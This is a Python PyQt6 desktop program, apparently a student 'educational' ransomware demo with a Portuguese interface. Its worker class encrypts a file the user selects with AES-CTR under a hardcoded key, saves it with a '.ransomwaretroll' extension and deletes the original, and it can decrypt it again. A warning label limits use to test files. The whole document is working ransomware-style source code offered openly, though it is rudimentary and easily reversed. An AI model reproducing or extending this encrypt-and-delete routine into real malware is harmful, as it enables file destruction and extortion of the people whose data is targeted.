import sys
import os
import pyaes
from PyQt6.QtWidgets import (QApplication, QMainWindow, QPushButton, QFileDialog, 
                           QVBoxLayout, QWidget, QLabel, QProgressBar)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QFont, QIcon

class CryptoWorker(QThread):
    progress = pyqtSignal(int)
    finished = pyqtSignal(str)
    
    def __init__(self, mode, file_path):
        super().__init__()
        self.mode = mode
        self.file_path = file_path
        self.key = b"testeransomwares"

    def run(self):
        try:
            if self.mode == "encrypt":
                self._encrypt_file()
            else:
                self._decrypt_file()
        except Exception as e:
            self.finished.emit(f"Erro: {str(e)}")

    def _encrypt_file(self):
        with open(self.file_path, "rb") as file:
            file_data = file.read()
        
        aes = pyaes.AESModeOfOperationCTR(self.key)
        crypto_data = aes.encrypt(file_data)
        
        encrypted_file = self.file_path + ".ransomwaretroll"
        with open(encrypted_file, "wb") as file:
            file.write(crypto_data)
        
        os.remove(self.file_path)
        self.finished.emit(f"Arquivo criptografado com sucesso!\nVerifique que '{os.path.basename(self.file_path)}' foi substituído por '{os.path.basename(encrypted_file)}'")

    def _decrypt_file(self):
        with open(self.file_path, "rb") as file:
            file_data = file.read()
        
        aes = pyaes.AESModeOfOperationCTR(self.key)
        decrypted_data = aes.decrypt(file_data)
        
        decrypted_file = self.file_path.replace(".ransomwaretroll", "")
        with open(decrypted_file, "wb") as file:
            file.write(decrypted_data)
        
        os.remove(self.file_path)
        self.finished.emit(f"Arquivo descriptografado com sucesso!\nVerifique que '{os.path.basename(self.file_path)}' foi restaurado para '{os.path.basename(decrypted_file)}'")

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Ransomware Project")
        self.setFixedSize(500, 450)  # Janela mais compacta
        
        # Configuração do estilo
        self.setStyleSheet("""
            QMainWindow {
                background-color: #2c3e50;
            }
            QPushButton {
                background-color: #3498db;
                color: white;
                border: none;
                padding: 10px;
                border-radius: 5px;
                font-size: 14px;
                min-width: 200px;
                margin: 5px;
            }
            QPushButton:hover {
                background-color: #2980b9;
            }
            QLabel {
                color: white;
                font-size: 13px;
                padding: 5px;
            }
            QProgressBar {
                border: 2px solid #3498db;
                border-radius: 5px;
                text-align: center;
                height: 20px;
                margin: 5px;
            }
            QProgressBar::chunk {
                background-color: #3498db;
            }
        """)

        # Widget central
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.setSpacing(10)  # Menos espaço entre elementos
        layout.setContentsMargins(20, 20, 20, 20)  # Margens menores

        # Título
        title = QLabel("Ransomware Project")
        title.setFont(QFont("Arial", 16, QFont.Weight.Bold))  
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(title)

        # Subtítulo
        subtitle = QLabel("Projeto para fins educacionais")
        subtitle.setFont(QFont("Arial", 12))  
        subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
        subtitle.setStyleSheet("color: #7f8c8d;")
        layout.addWidget(subtitle)

        # Espaçador pequeno
        layout.addSpacing(10)

        # Container para botões
        button_container = QWidget()
        button_layout = QVBoxLayout(button_container)
        button_layout.setSpacing(8)  # Espaço menor entre botões
        button_layout.setContentsMargins(0, 0, 0, 0)  # Sem margens

        # Botões
        encrypt_btn = QPushButton(" Criptografar Arquivo", self)
        encrypt_btn.clicked.connect(lambda: self.handle_file_operation("encrypt"))
        button_layout.addWidget(encrypt_btn)

        decrypt_btn = QPushButton(" Descriptografar Arquivo", self)
        decrypt_btn.clicked.connect(lambda: self.handle_file_operation("decrypt"))
        button_layout.addWidget(decrypt_btn)

        layout.addWidget(button_container)

        # Status
        self.status_label = QLabel("")
        self.status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.status_label.setWordWrap(True)
        layout.addWidget(self.status_label)

        # Barra de progresso
        self.progress_bar = QProgressBar()
        self.progress_bar.setMaximum(100)
        self.progress_bar.hide()
        layout.addWidget(self.progress_bar)

        # Aviso
        warning_text = (" ATENÇÃO: Use apenas o arquivo teste.txt ou arquivos não importantes!\n"
                       "Nunca use em arquivos pessoais ou importantes!\n"
                       "Este é apenas um projeto demonstrativo.")
        warning = QLabel(warning_text)
        warning.setStyleSheet("""
            color: #e74c3c;
            font-weight: bold;
            background-color: rgba(231, 76, 60, 0.1);
            border-radius: 5px;
            padding: 10px;
            margin: 5px;
            font-size: 12px;
        """)
        warning.setAlignment(Qt.AlignmentFlag.AlignCenter)
        warning.setWordWrap(True)
        warning.setMinimumHeight(80)
        layout.addWidget(warning)

    def handle_file_operation(self, mode):
        if mode == "encrypt":
            file_path, _ = QFileDialog.getOpenFileName(self, "Selecione um arquivo para criptografar")
        else:
            file_path, _ = QFileDialog.getOpenFileName(
                self, 
                "Selecione um arquivo para descriptografar",
                filter="Arquivos Criptografados (*.ransomwaretroll)"
            )
        
        if file_path:
            self.progress_bar.show()
            self.status_label.setText("Processando arquivo...\nAguarde um momento...")
            self.status_label.setStyleSheet("color: #f1c40f;")  # Amarelo para processando
            
            self.worker = CryptoWorker(mode, file_path)
            self.worker.finished.connect(self.on_operation_complete)
            self.worker.start()

    def on_operation_complete(self, message):
        self.status_label.setText(message)
        self.status_label.setStyleSheet("color: #2ecc71;")  # Verde para sucesso
        self.progress_bar.hide()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())
